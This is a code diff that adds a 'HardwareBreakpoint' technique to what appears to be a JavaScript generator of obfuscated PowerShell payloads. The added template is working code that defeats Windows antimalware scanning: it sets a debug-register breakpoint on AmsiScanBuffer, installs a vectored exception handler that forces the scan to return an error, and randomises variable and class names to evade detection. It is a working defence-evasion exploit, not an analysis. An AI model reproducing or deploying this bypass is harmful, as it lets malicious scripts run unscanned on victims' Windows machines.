@@ -334,6 +334,89 @@ TechniqueRegistry.register({
   }
 });
 
+TechniqueRegistry.register({
+  name: 'HardwareBreakpoint',
+  description: 'VEH + debug registers on AmsiScanBuffer (no memory patching)',
+  generate() {
+    const vType = randomVarName();
+    const vLib = randomVarName();
+    const vAddr = randomVarName();
+    const vHandler = randomVarName();
+    const className = randomVarName();
+
+    const raw =
+`$${vType} = @"
+using System;
+using System.Runtime.InteropServices;
+public class ${className} {
+    [DllImport("kernel32")]
+    public static extern IntPtr LoadLibrary(string name);
+    [DllImport("kernel32")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+    [DllImport("kernel32")]
+    public static extern IntPtr GetCurrentThread();
+    [DllImport("kernel32")]
+    public static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT ctx);
+    [DllImport("kernel32")]
+    public static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT ctx);
+    [DllImport("kernel32")]
+    public static extern IntPtr AddVectoredExceptionHandler(uint first, IntPtr handler);
+    public delegate long VEH(IntPtr pExceptionInfo);
+    [StructLayout(LayoutKind.Sequential)]
+    public struct CONTEXT {
+        public long P1Home, P2Home, P3Home, P4Home, P5Home, P6Home;
+        public uint ContextFlags;
+        public uint MxCsr;
+        public ushort SegCs, SegDs, SegEs, SegFs, SegGs, SegSs;
+        public uint EFlags;
+        public ulong Dr0, Dr1, Dr2, Dr3, Dr6, Dr7;
+        public ulong Rax, Rcx, Rdx, Rbx, Rsp, Rbp, Rsi, Rdi;
+        public ulong R8, R9, R10, R11, R12, R13, R14, R15;
+        public ulong Rip;
+        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1232)]
+        public byte[] ExtRegs;
+    }
+    private static IntPtr _target;
+    public static void SetTarget(IntPtr addr) { _target = addr; }
+    public static long Handler(IntPtr pInfo) {
+        var rec = Marshal.ReadIntPtr(pInfo);
+        var code = (uint)Marshal.ReadInt32(rec);
+        var ctx = Marshal.ReadIntPtr(pInfo, IntPtr.Size);
+        if (code == 0x80000004) {
+            var rip = Marshal.ReadInt64(ctx, 0xF8);
+            if ((ulong)rip == (ulong)_target) {
+                Marshal.WriteInt64(ctx, 0x78, 0x80070057);
+                var dr7 = Marshal.ReadInt64(ctx, 0x70);
+                Marshal.WriteInt64(ctx, 0x70, dr7 & ~(long)1);
+            }
+        }
+        return 0;
+    }
+}
+"@
+Add-Type $${vType}
+$${vLib} = [${className}]::LoadLibrary('amsi.dll')
+$${vAddr} = [${className}]::GetProcAddress($${vLib}, 'AmsiScanBuffer')
+[${className}]::SetTarget($${vAddr})
+$${vHandler} = [${className}+VEH]::new([${className}], 'Handler')
+[${className}]::AddVectoredExceptionHandler(1, [System.Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate($${vHandler}))
+$ctx = New-Object ${className}+CONTEXT
+$ctx.ContextFlags = 0x100010
+$thread = [${className}]::GetCurrentThread()
+[${className}]::GetThreadContext($thread, [ref]$ctx)
+$ctx.Dr0 = [uint64]$${vAddr}
+$ctx.Dr7 = $ctx.Dr7 -bor 1
+[${className}]::SetThreadContext($thread, [ref]$ctx)`;
+
+    return createPayload({
+      raw,
+      technique: 'HardwareBreakpoint',
+      variables: [`$${vType}`, `$${vLib}`, `$${vAddr}`, `$${vHandler}`, '$ctx', '$thread'],
+      sensitiveStrings: ['AmsiScanBuffer', 'amsi.dll']
+    });
+  }
+});
+
 // ============================================================
 // String Encoding Methods
 // ============================================================
